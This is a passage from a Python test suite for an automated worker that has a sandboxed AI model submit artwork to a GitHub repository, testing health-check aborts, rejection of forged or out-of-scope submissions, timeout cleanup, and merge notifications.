        self.assertEqual(1, state["cycle"])
        self.assertEqual("new-piece", state["last_slug"])

        self.assertEqual(1, len(self.frames))
        self.assertEqual("neighbor.acted", self.frames[0][1])
        self.assertTrue(self.frames[0][2]["merged"])

        self.assertEqual(1, len(self.notifications))
        self.assertIn(EW.SUCCESS_PREFIX, self.texts()[0])
        self.assertEqual([], self.workspaces(), "the temp clone must be removed")

    def test_the_second_cycle_must_continue_the_first(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        # a model that restarts the count at 1 is rejected, not published
        with mock.patch.object(EW, "run_model",
                               self.model_that_submits(slug="second-piece")):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertIn("continuity", summary["detail"])
        # and the honest continuation is accepted
        with mock.patch.object(EW, "run_model",
                               self.model_that_submits(slug="second-piece", cycle=2,
                                                       previous="new-piece")):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)

    def test_the_prompt_forbids_publishing_and_names_the_invariants(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        for phrase in ("There is NO repository here", "no .git directory",
                       "no shell, no git, no gh and no network tool",
                       "clone you never see", "/out/submission/meta.json",
                       "You cannot create directories",
                       "slug goes in meta.json",
                       f"EXACTLY {EW.CANDIDATES_PER_ROUND}", "state-out.json"):
            self.assertIn(phrase, self.prompt)
        self.assertNotIn("/clone ", self.prompt,
                         "the maker is never told where the clone is")

    # ── the refusals ──
    def test_a_critical_check_before_the_merge_aborts_and_closes_the_pr(self):
        phases = {"start": healthy(), "pre-write": healthy(),
                  "pre-merge": critical("rb_workflows")}
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: phases[phase])

        self.assertEqual(EW.OUTCOME_ABORTED, summary["outcome"])
        self.assertIn("rb_workflows", summary["detail"])
        self.assertFalse(self.gh.called("pr", "merge"), "must not merge mid-outage")
        self.assertTrue(self.gh.called("pr", "close"), "the open PR must be closed")
        self.assertNotIn("submissions/new-piece",
                         git_bare(self.origin, "ls-tree", "--name-only", "-r", "main"))
        self.assertFalse(any(EW.SUCCESS_PREFIX in n for n in self.texts()))
        self.assertFalse((self.state / "evolve-creative-state.json").exists(),
                         "an aborted cycle must not advance the creative ledger")
        history = json.loads(EW.HISTORY_PATH.read_text())
        self.assertEqual(EW.OUTCOME_ABORTED, history[0]["outcome"])
        self.assertEqual([], self.workspaces())

    def test_a_critical_check_at_the_start_never_spends_the_model(self):
        with mock.patch.object(EW, "run_model") as model:
            summary = EW.run_once(cfg=self.cfg,
                                  health=lambda phase: critical("rv_validation"))
        self.assertEqual("skipped", summary["outcome"])
        model.assert_not_called()
        self.assertEqual([], EW.load_history())

    def test_degraded_runs_only_when_every_failing_id_is_allowlisted(self):
        allowed = {"status": "degraded", "critical": [],
                   "failed": ["w_openrappter_spin"], "checks": [], "summary": "x"}
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: allowed)
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)

        unlisted = {"status": "degraded", "critical": [],
                    "failed": ["w_openrappter_spin", "rb_shards"],
                    "checks": [], "summary": "x"}
        with mock.patch.object(EW, "run_model") as model:
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: unlisted)
        self.assertEqual("skipped", summary["outcome"])
        self.assertIn("rb_shards", summary["reason"])
        model.assert_not_called()

    def test_a_pr_that_touches_more_than_the_submission_is_never_merged(self):
        self.gh.extra_file = "submissions/index.json"
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertIn("index.json", summary["detail"])
        self.assertFalse(self.gh.called("pr", "merge"))
        self.assertTrue(self.gh.called("pr", "close"))
        self.assertFalse(any(EW.SUCCESS_PREFIX in n for n in self.texts()))

    def test_a_failed_pr_creation_does_not_orphan_the_pushed_branch(self):
        def failing_create(*args, timeout=None):
            self.gh.calls.append(args)
            if args[:2] == ("pr", "create"):
                raise EW.CommandError("gh pr create exited 1: rate limited")
            raise AssertionError(f"unexpected gh call: {args}")
        with mock.patch.object(EW, "_gh", failing_create), \
             mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_FAILED, summary["outcome"])
        branches = git_bare(self.origin, "for-each-ref", "--format=%(refname)",
                            "refs/heads/")
        self.assertEqual(["refs/heads/main"], branches.split(),
                         "a pushed branch with no PR must be deleted again")
        self.assertFalse(any(EW.SUCCESS_PREFIX in n for n in self.texts()))

    def test_a_timeout_is_recorded_without_a_success_shaped_alert(self):
        def timing_out(staging, prompt, wcfg, depth=0, runtime=None):
            return EW.OUTCOME_TIMEOUT, "copilot timed out after 60s"
        with mock.patch.object(EW, "run_model", timing_out):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual(EW.OUTCOME_TIMEOUT, summary["outcome"])
        history = json.loads(EW.HISTORY_PATH.read_text())
        self.assertEqual(1, len(history), "a timeout still consumed the budget")
        self.assertEqual(EW.OUTCOME_TIMEOUT, history[0]["outcome"])
        self.assertFalse(self.gh.calls, "nothing may reach GitHub after a timeout")
        self.assertEqual(1, len(self.notifications))
        self.assertNotIn(EW.SUCCESS_PREFIX, self.texts()[0])
        self.assertIn("timeout", self.texts()[0])
        self.assertFalse((self.state / "evolve-creative-state.json").exists())
        self.assertEqual([], self.workspaces(), "a timeout still cleans up")

    def test_the_real_timeout_path_kills_the_tree_and_reports_timeout(self):
        # A real process that ignores the clock, killed by the real code path.
        wcfg = dict(EW.worker_config({}), timeout_s=2)
        wcfg["fanout"] = {"isolated_home": False, "kill_grace_s": 1}
        argv = [sys.executable, "-c",
                "import subprocess, sys, time;"
                "p = subprocess.Popen([sys.executable, '-c', 'import time;"
                " time.sleep(90)']);"
                "open('gc.pid','w').write(str(p.pid)); time.sleep(90)"]
        with mock.patch.object(EW.SS, "confined_argv", return_value=argv), \
             mock.patch.object(EW.SS, "sandbox_wrap",
                               lambda a, w, e, profile_dir=None: a):
            status, out = EW.run_model(self.home, "prompt", wcfg)
        self.assertEqual(EW.OUTCOME_TIMEOUT, status)
        self.assertIn("timed out", out)
        self.assertEqual([], EW.live_processes(), "the registry is drained")
        grandchild = int((self.home / "gc.pid").read_text())
        deadline = time.monotonic() + 5
        while time.monotonic() < deadline:
            try:
                os.kill(grandchild, 0)
            except ProcessLookupError:
                break
            time.sleep(0.05)
        else:
            self.fail("the maker's grandchild outlived the timeout")

    def test_a_declined_cycle_is_recorded_without_a_paintbrush(self):
        def declining(staging, prompt, wcfg, depth=0, runtime=None):
            return "ok", "SENTINEL_RESULT: DECLINED nothing worth making today\n"
        with mock.patch.object(EW, "run_model", declining):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_DECLINED, summary["outcome"])
        self.assertFalse(self.gh.calls)
        self.assertEqual([], self.notifications, "declines are quiet by default")
        history = json.loads(EW.HISTORY_PATH.read_text())
        self.assertEqual(EW.OUTCOME_DECLINED, history[0]["outcome"])
        self.assertFalse((self.state / "evolve-creative-state.json").exists())

    def test_a_maker_cannot_reach_a_repository_at_all(self):
        seen = {}

        def looking_for_git(staging, prompt, wcfg, depth=0, runtime=None):
            staging = Path(staging)
            seen["entries"] = sorted(p.name for p in staging.iterdir())
            seen["git"] = list(staging.rglob(".git"))
            seen["add_dirs"] = [a for a in EW.maker_argv(wcfg, staging)]
            write_submission(staging / "out", "new-piece", meta_for("new-piece"))
            (staging / "state-out.json").write_text(json.dumps(
                {"cycle": 1, "last_slug": "new-piece", "notes": "n"}),
                encoding="utf-8")
            return "ok", "SENTINEL_RESULT: CONTRIBUTED\n"

        with mock.patch.object(EW, "run_model", looking_for_git):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)
        self.assertEqual([], seen["git"], "no .git may exist in the maker's root")
        self.assertNotIn("clone", seen["entries"])
        add_dirs = [seen["add_dirs"][i + 1] for i, a in enumerate(seen["add_dirs"])
                    if a == "--add-dir"]
        self.assertEqual(1, len(add_dirs))
        self.assertTrue(add_dirs[0].endswith("staging"), add_dirs)

    def test_a_missing_next_state_file_is_rejected_before_any_remote_call(self):
        def no_state(staging, prompt, wcfg, depth=0, runtime=None):
            write_submission(Path(staging) / "out", "new-piece",
                             meta_for("new-piece"))
            return "ok", "SENTINEL_RESULT: CONTRIBUTED\n"
        with mock.patch.object(EW, "run_model", no_state):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertIn("state-out.json", summary["detail"])
        self.assertFalse(self.gh.calls)

    def test_roles_rotate_across_passes(self):
        seen = []

        def watcher(staging, prompt, wcfg, depth=0, runtime=None):
            seen.append(wcfg["role"])
            return EW.OUTCOME_FAILED, "no model here"
        with mock.patch.object(EW, "run_model", watcher):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(2, len(seen))
        self.assertNotEqual(seen[0], seen[1], "one neighbor must not dominate")

    def test_the_worker_stands_down_for_the_stop_file(self):
        EW.STOP.write_text("halt", encoding="utf-8")
        with mock.patch.object(EW, "run_model") as model:
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("skipped", summary["outcome"])
        model.assert_not_called()

    def test_a_disabled_worker_does_nothing(self):
        cfg = dict(self.cfg, evolve_worker={"enabled": False})
        with mock.patch.object(EW, "run_model") as model:
            summary = EW.run_once(cfg=cfg, health=lambda phase: healthy())
        self.assertEqual("skipped", summary["outcome"])
        model.assert_not_called()


def child_result(role, n=6, ok=True, wave=1, error="", critique=(),
                 verifier=None):
    """A sub-sentinel report in the shape subsentinels.run_children returns."""
    report = None
    if ok:
        report = {
            "role": role,
            "candidates": [
                {"id": f"c{i}", "premise": f"{role} premise {i}",
                 "rationale": "because",
                 "scores": {d: 5 + (i % 3) for d in SS.SCORE_DIMENSIONS}}
                for i in range(1, n + 1)],
            "evidence": [{"claim": "checked", "source": "prior.json"}],
            "critique": list(critique),
        }
    return {"role": role, "wave": wave, "ok": ok, "error": error,
            "verifier": bool(wave >= 2 if verifier is None else verifier),
            "timed_out": False, "exit_code": 0 if ok else 1, "elapsed_s": 2.0,
            "report": report}


class FanoutIntegrationTests(WorkerEnv):
    """The fan-out inside a real cycle: bounded, binding, and never silent."""

    def setUp(self):
        super().setUp()
        self.cfg = worker_cfg(evolve_worker={
            "repo": str(self.origin),
            "git_author_name": "test",
            "git_author_email": "t@example.com",
            "fanout": {"enabled": True, "children": 3},
        })

    def maker_using_finalists(self, slug="new-piece", cycle=1, previous=None,
                              honour=True, forge=None):
        """A maker that copies round1.json, the way the prompt tells it to.

        `honour=False` keeps its own ids; `forge` rewrites one field of one
        record while keeping every id — the attack the digests exist for.
        """
        def fake(staging, prompt, wcfg, depth=0, runtime=None):
            self.prompt = prompt
            staging = Path(staging)
            records = json.loads((staging / "round1.json").read_text())
            self.finalists = [c["id"] for c in records]
            if forge:
                records = [dict(r) for r in records]
                records[0].update(forge)
            write_submission(staging / "out", slug, meta_for(
                slug, cycle=cycle, previous=previous,
                round1_records=records if honour else None))
            (staging / "state-out.json").write_text(json.dumps({
                "cycle": cycle, "last_slug": slug, "notes": "n"}), encoding="utf-8")
            return "ok", "SENTINEL_RESULT: CONTRIBUTED\n"
        return fake

    def patched_children(self, results):
        return mock.patch.object(EW.SS, "run_children", return_value=results)

    def test_the_finalists_bind_round_one_and_the_cycle_merges(self):
        results = [child_result("novelty-archaeologist"),
                   child_result("execution-designer"),
                   child_result("adversarial-verifier", wave=2)]
        with self.patched_children(results), \
             mock.patch.object(EW, "run_model", self.maker_using_finalists()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)
        self.assertEqual(10, len(self.finalists))
        self.assertIn("THE TEN FINALISTS", self.prompt)
        self.assertIn("MUST be exactly these ten records", self.prompt)
        self.assertIn("round1.json", self.prompt)
        for cid in self.finalists:
            self.assertIn(cid, self.prompt)
        row = json.loads(EW.HISTORY_PATH.read_text())[0]
        self.assertEqual(3, row["children"])
        self.assertEqual([], row["child_failures"])
        self.assertEqual(3, SS.children_spent([row]))

    def test_a_maker_that_ignores_its_sub_sentinels_is_rejected(self):
        results = [child_result("a"), child_result("b"),
                   child_result("adversarial-verifier", wave=2)]
        with self.patched_children(results), \
             mock.patch.object(EW, "run_model",
                               self.maker_using_finalists(honour=False)):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertIn("exactly the ten finalists", summary["detail"])
        self.assertFalse(self.gh.calls, "nothing reaches GitHub")
        self.assertFalse(any(EW.SUCCESS_PREFIX in n for n in self.texts()))

    def test_a_partial_failure_that_still_yields_ten_continues(self):
        results = [child_result("a"), child_result("b"),
                   child_result("d", ok=False, error="timed out after 600s"),
                   child_result("adversarial-verifier", wave=2)]
        with self.patched_children(results), \
             mock.patch.object(EW, "run_model", self.maker_using_finalists()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)
        row = json.loads(EW.HISTORY_PATH.read_text())[0]
        self.assertEqual(["d: timed out after 600s"], row["child_failures"])
        self.assertIn("CHILDREN THAT FAILED", self.prompt,
                      "the maker is told what it did not get")

    def test_a_failed_fanout_never_reaches_the_maker(self):
        results = [child_result("a", ok=False, error="wrote no report"),
                   child_result("b", ok=False, error="exited 1"),
                   child_result("adversarial-verifier", wave=2, ok=False,
                                error="timed out")]
        with self.patched_children(results), \
             mock.patch.object(EW, "run_model") as maker:
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual(EW.OUTCOME_FANOUT, summary["outcome"])
        maker.assert_not_called()
        self.assertFalse(self.gh.calls)
        self.assertFalse(any(EW.SUCCESS_PREFIX in n for n in self.texts()))
        self.assertEqual(1, len(self.notifications))
        self.assertIn("fanout-failed", self.texts()[0])
        row = json.loads(EW.HISTORY_PATH.read_text())[0]
        self.assertEqual(EW.OUTCOME_FANOUT, row["outcome"])
        self.assertEqual(3, row["children"], "children cost credit even so")
        self.assertEqual(3, len(row["child_failures"]))
        self.assertFalse((self.state / "evolve-creative-state.json").exists())
        self.assertEqual([], self.workspaces())

    def test_too_few_survivors_is_a_named_failure_not_nine_finalists(self):
        results = [child_result("a", n=5),
                   child_result("adversarial-verifier", wave=2, n=4)]
        with self.patched_children(results), \
             mock.patch.object(EW, "run_model") as maker:
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_FANOUT, summary["outcome"])
        self.assertIn("9 candidate(s) survived", summary["detail"])
        maker.assert_not_called()

    def test_an_unavailable_fanout_skips_instead_of_making_art_alone(self):
        cfg = worker_cfg(evolve_worker={
            "repo": str(self.origin),
            "fanout": {"enabled": True, "children": 3, "daily_child_budget": 0},
        })
        with mock.patch.object(EW, "run_model") as maker, \
             mock.patch.object(EW.SS, "run_children") as children:
            summary = EW.run_once(cfg=cfg, health=lambda phase: healthy())

        self.assertEqual("skipped", summary["outcome"])
        self.assertIn("child budget spent", summary["reason"])
        maker.assert_not_called()
        children.assert_not_called()
        self.assertFalse(EW.HISTORY_PATH.exists(),
                         "deciding not to start spends nothing and writes no row")
        status = json.loads(EW.STATUS_PATH.read_text())
        self.assertEqual("skipped", status["outcome"])

    def test_a_nested_worker_run_refuses_itself(self):
        with mock.patch.dict(os.environ, {SS.DEPTH_ENV: "1"}), \
             mock.patch.object(EW, "run_model") as maker, \
             mock.patch.object(EW.SS, "run_children") as children:
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("skipped", summary["outcome"])
        self.assertIn("nested run refused", summary["reason"])
        maker.assert_not_called()
        children.assert_not_called()

    def test_children_are_planned_but_never_spawned_by_a_child(self):
        fcfg = SS.fanout_config(EW.worker_config(self.cfg))
        self.assertEqual(3, len(SS.plan_children(fcfg, [], 0)[0]))
        self.assertEqual([], SS.plan_children(fcfg, [], 1)[0])

    def test_children_receive_every_prior_submission_but_no_repository(self):
        results = [child_result("a"), child_result("b"),
                   child_result("adversarial-verifier", wave=2)]
        with self.patched_children(results) as children, \
             mock.patch.object(EW, "run_model", self.maker_using_finalists()):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        prior = children.call_args.args[6]
        self.assertEqual(["already-here"], [p["slug"] for p in prior])
        self.assertIn("title", prior[0])
        workspace = children.call_args.args[2]
        self.assertFalse((Path(workspace) / "children" / "a" / ".git").exists(),
                         "a child never gets a repository of its own")

    def test_the_dry_run_reports_the_planned_cast(self):
        summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy(),
                              dry_run=True)
        self.assertEqual("dry-run", summary["outcome"])
        self.assertEqual(0, summary["depth"])
        self.assertEqual(["novelty-archaeologist", "execution-designer",
                          "adversarial-verifier"], summary["children"])

    def test_a_solo_cycle_still_works_when_the_fanout_is_off(self):
        cfg = worker_cfg(evolve_worker={
            "repo": str(self.origin), "fanout": {"enabled": False}})
        with mock.patch.object(EW, "run_model", self.model_that_submits()), \
             mock.patch.object(EW.SS, "run_children") as children:
            summary = EW.run_once(cfg=cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)
        children.assert_not_called()
        self.assertNotIn("THE TEN FINALISTS", self.prompt)


class ArtNotificationTests(WorkerEnv):
    """The message a merge earns — and the silence everything else earns."""

    VIEW = ("https://kody-w.github.io/public-art-collective/"
            "submissions/new-piece/piece.svg")
    SOURCE = ("https://github.com/kody-w/public-art-collective/blob/main/"
              "submissions/new-piece/piece.svg")

    def test_exactly_one_message_on_a_verified_merge(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)
        self.assertEqual(1, len(self.notifications),
                         "one merge, one message — not two, not zero")

        note = self.notifications[0]
        text = note["text"]
        self.assertIn(EW.SUCCESS_PREFIX, text)
        self.assertIn("New Piece", text, "the title a human recognises")
        self.assertIn(f"View: {self.VIEW}", text, "one tap to the artwork")
        self.assertIn(f"Source: {self.SOURCE}", text)
        self.assertIn(f"PR: {summary['receipts']['pr_url']}", text)
        self.assertEqual("+15550000002", note["to"],
                         "art news goes to the configured report number")

    def test_the_message_carries_a_one_sentence_concept(self):
        meta = meta_for("new-piece", _artist_statement=(
            "A clock that lies about the time. Then it goes on at length "
            "about clocks for several more sentences nobody will read on a "
            "phone."))

        def maker(staging, prompt, wcfg, depth=0, runtime=None):
            write_submission(Path(staging) / "out", "new-piece", meta)
            (Path(staging) / "state-out.json").write_text(json.dumps(
                {"cycle": 1, "last_slug": "new-piece", "notes": "n"}),
                encoding="utf-8")
            return "ok", "SENTINEL_RESULT: CONTRIBUTED\n"

        with mock.patch.object(EW, "run_model", maker):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        text = self.texts()[0]
        self.assertIn("A clock that lies about the time.\n", text,
                      "one sentence, no trailing whitespace before the links")
        self.assertNotIn("nobody will read on a phone", text)

    def test_a_long_statement_is_truncated_not_pasted(self):
        self.assertEqual(80, len(EW.concept_sentence(
            {"_concept": "x" * 500}, limit=80)))
        self.assertTrue(EW.concept_sentence({"_concept": "x" * 500},
                                            limit=80).endswith("\u2026"))

    def test_the_concept_falls_back_to_the_winning_premise(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertIn("premise 1.1", self.texts()[0],
                      "the premise that actually won its cycle")

    def test_the_static_report_is_rebuilt_after_the_merge_is_recorded(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        note = self.notifications[0]
        self.assertTrue(note["rebuild"], "linked evidence must be current")
        self.assertEqual([EW.OUTCOME_CONTRIBUTED],
                         [r["outcome"] for r in note["history"]],
                         "the ledger is written before the message is built")

    def test_commons_repo_wins_over_the_worker_repo(self):
        cfg = dict(self.cfg, commons_repo="someone-else/other-commons")
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            EW.run_once(cfg=cfg, health=lambda phase: healthy())
        text = self.texts()[0]
        self.assertIn("https://someone-else.github.io/other-commons/"
                      "submissions/new-piece/piece.svg", text)
        self.assertIn("https://github.com/someone-else/other-commons/blob/main/"
                      "submissions/new-piece/piece.svg", text)

    def test_no_message_for_a_timeout(self):
        with mock.patch.object(EW, "run_model",
                               lambda ws, p, w, d=0, r=None: (EW.OUTCOME_TIMEOUT, "timed out")):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(1, len(self.notifications))
        self.assertNotIn("View:", self.texts()[0])
        self.assertNotIn(EW.SUCCESS_PREFIX, self.texts()[0])

    def test_no_message_for_a_declined_cycle(self):
        with mock.patch.object(
                EW, "run_model",
                lambda ws, p, w, d=0, r=None: ("ok", "SENTINEL_RESULT: DECLINED not today\n")):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual([], self.notifications)

    def test_a_model_claiming_success_without_a_merge_gets_no_art_message(self):
        # SENTINEL_RESULT is a claim; the health abort means nothing merged.
        phases = {"start": healthy(), "pre-write": healthy(),
                  "pre-merge": critical("rb_workflows")}
        with mock.patch.object(EW, "run_model", self.model_that_submits(
                result="CONTRIBUTED and it is live, I promise")):
            summary = EW.run_once(cfg=self.cfg,
                                  health=lambda phase: phases[phase])
        self.assertEqual(EW.OUTCOME_ABORTED, summary["outcome"])
        for text in self.texts():
            self.assertNotIn("View:", text)
            self.assertNotIn(EW.SUCCESS_PREFIX, text)

    def test_no_art_message_when_the_gate_rejects(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits(
                slug="second-piece", cycle=9)):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertFalse(any("View:" in t for t in self.texts()))


class ArtUrlTests(unittest.TestCase):
    """URL derivation is deterministic, encoded, and per-extension correct."""

    def urls(self, piece_path, commons="kody-w/public-art-collective",
             base="main"):
        return EW.art_urls({"commons_repo": commons},
                           {"repo": "ignored/when-commons-set",
                            "base_branch": base},
                           {"piece_path": piece_path})

    def test_every_supported_extension_maps_to_its_own_path(self):
        for ext in sorted(EW.KIND_EXTENSIONS.values()):
            with self.subTest(ext=ext):
                view, source = self.urls(f"submissions/a-slug/piece{ext}")
                self.assertEqual(
                    f"https://kody-w.github.io/public-art-collective/"
                    f"submissions/a-slug/piece{ext}", view)
                self.assertEqual(
                    f"https://github.com/kody-w/public-art-collective/blob/main/"
                    f"submissions/a-slug/piece{ext}", source)

    def test_path_separators_survive_and_segments_are_encoded(self):
        view, source = self.urls("submissions/a b/piece.svg")
        self.assertIn("/submissions/a%20b/piece.svg", view)
        self.assertIn("/submissions/a%20b/piece.svg", source)
        self.assertEqual(4, view.count("/") - 2, "slashes are not encoded away")

    def test_a_non_default_branch_lands_in_the_source_url(self):
        _, source = self.urls("submissions/a/piece.md", base="trunk")
        self.assertIn("/blob/trunk/", source)

    def test_the_pages_host_is_lowercased_but_the_repo_is_not(self):
        view, source = self.urls("submissions/a/piece.svg",
                                 commons="Kody-W/Public-Art-Collective")
        self.assertTrue(view.startswith("https://kody-w.github.io/Public-Art-Collective/"))
        self.assertIn("github.com/Kody-W/Public-Art-Collective/", source)

    def test_a_full_url_or_git_remote_still_yields_owner_and_name(self):
        for commons in ("https://github.com/kody-w/public-art-collective",
                        "https://github.com/kody-w/public-art-collective.git",
                        "git@github.com:kody-w/public-art-collective.git"):
            with self.subTest(commons=commons):
                view, _ = self.urls("submissions/a/piece.svg", commons=commons)
                self.assertEqual("https://kody-w.github.io/public-art-collective/"
                                 "submissions/a/piece.svg", view)

    def test_a_local_path_is_not_a_public_url(self):
        view, source = EW.art_urls(
            {"commons_repo": ""}, {"repo": "/Users/someone/origin.git",
                                   "base_branch": "main"},
            {"piece_path": "submissions/a/piece.svg"})
        self.assertEqual(("", ""), (view, source))

    def test_the_worker_repo_is_used_when_commons_repo_is_unset(self):
        view, _ = EW.art_urls({}, {"repo": "kody-w/public-art-collective",
                                   "base_branch": "main"},
                              {"piece_path": "submissions/a/piece.txt"})
        self.assertEqual("https://kody-w.github.io/public-art-collective/"
                         "submissions/a/piece.txt", view)

    def test_a_message_without_a_derivable_url_says_so(self):
        text = EW.art_notification(
            {"instance_name": "Dada"}, {"repo": "/local/path"},
            {"title": "Thing", "piece_path": "submissions/a/piece.svg",
             "meta": {"title": "Thing"}}, {"pr_url": "https://example/pr/1"})
        self.assertIn("no public URL derivable", text)
        self.assertIn("PR: https://example/pr/1", text)

    def test_the_recipient_prefers_the_report_number(self):
        self.assertEqual("+1555", EW.art_recipient(
            {"report_number": "+1555", "notify_handle": "+1999"}))
        self.assertEqual("+1999", EW.art_recipient({"notify_handle": "+1999"}))
        self.assertEqual("", EW.art_recipient({}))


class ArtDeliveryTests(WorkerEnv):
    """The art text goes through the ordinary outbox — once — and is then the
    delivery layer's business to classify, not this worker's to assert."""

    def setUp(self):
        super().setUp()
        import outbox
        import standup
        self.outbox = outbox
        self.enqueued = []
        # sentinel.notify is NOT patched here: the point is to watch the real
        # notify path reach the real queue exactly once.
        for target, name, value in (
                (EW.sentinel, "notify", REAL_NOTIFY),
                (outbox, "enqueue", lambda text, to, attachments=None:
                 self.enqueued.append({"text": text, "to": to,
                                       "attachments": attachments})),
                (outbox, "drain", mock.Mock(return_value=(1, 0, "sent"))),
                (standup, "portable_snapshot", mock.Mock(return_value="snap.html")),
                (standup, "publish_snapshot",
                 mock.Mock(return_value=["http://192.0.2.9:9797/share/x.html"])),
        ):
            p = mock.patch.object(target, name, value)
            p.start()
            self.addCleanup(p.stop)
        self.drain = outbox.drain
        self.snapshot = standup.portable_snapshot

    def test_a_verified_merge_enqueues_exactly_one_message(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)
        self.assertEqual(1, len(self.enqueued), "one merge, one queued message")
        message = self.enqueued[0]
        self.assertEqual("+15550000002", message["to"])
        self.assertIn("New Piece", message["text"])
        self.assertIn("View: https://kody-w.github.io/public-art-collective/"
                      "submissions/new-piece/piece.svg", message["text"])
        self.assertIn("Static HTML report:", message["text"],
                      "the rebuilt report rides along as evidence")
        self.assertTrue(self.snapshot.call_args.kwargs["rebuild"])
        self.assertEqual(1, self.drain.call_count,
                         "the delivery layer, not this worker, decides what "
                         "'sent' means")

    def test_a_queue_only_instance_still_enqueues_and_never_sends(self):
        cfg = dict(self.cfg, notify_queue_only=True)
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            EW.run_once(cfg=cfg, health=lambda phase: healthy())
        self.assertEqual(1, len(self.enqueued))
        self.drain.assert_not_called()

    def test_nothing_is_enqueued_when_the_merge_is_not_verified(self):
        phases = {"start": healthy(), "pre-write": healthy(),
                  "pre-merge": critical("rb_workflows")}
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg,
                                  health=lambda phase: phases[phase])
        self.assertEqual(EW.OUTCOME_ABORTED, summary["outcome"])
        self.assertEqual(1, len(self.enqueued), "the abort is reported…")
        self.assertNotIn("View:", self.enqueued[0]["text"], "…but not as art")
        self.assertNotIn(EW.SUCCESS_PREFIX, self.enqueued[0]["text"])

    def test_the_worker_never_claims_delivery_it_cannot_verify(self):
        # A queue that cannot be drained must not turn a merge into a failure,
        # and must not turn a failed send into a success either: the merge is
        # recorded, the message is queued, and alert_delivery is what tells a
        # human the channel is broken.
        self.outbox.drain.side_effect = RuntimeError("Messages is not running")
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"])
        self.assertEqual(1, len(self.enqueued))
        row = json.loads(EW.HISTORY_PATH.read_text())[0]
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, row["outcome"])
        self.assertIn("merge_commit", row)

    def test_unverified_delivery_blocks_the_next_cycle(self):
        # outbox.status() reports unverified/dead-letter counts (232ce7e);
        # checks.py turns those into a failing alert_delivery, and this worker
        # refuses to make more art until a human has been reachable again.
        degraded = {"status": "degraded", "critical": [],
                    "failed": ["alert_delivery"], "checks": [], "summary": "x"}
        cfg = worker_cfg(evolve_worker={
            "repo": str(self.origin),
            "degraded_allowlist": ["alert_delivery", "w_openrappter_spin"]})
        with mock.patch.object(EW, "run_model") as maker:
            summary = EW.run_once(cfg=cfg, health=lambda phase: degraded)
        self.assertEqual("skipped", summary["outcome"])
        self.assertIn("alert_delivery", summary["reason"])
        maker.assert_not_called()
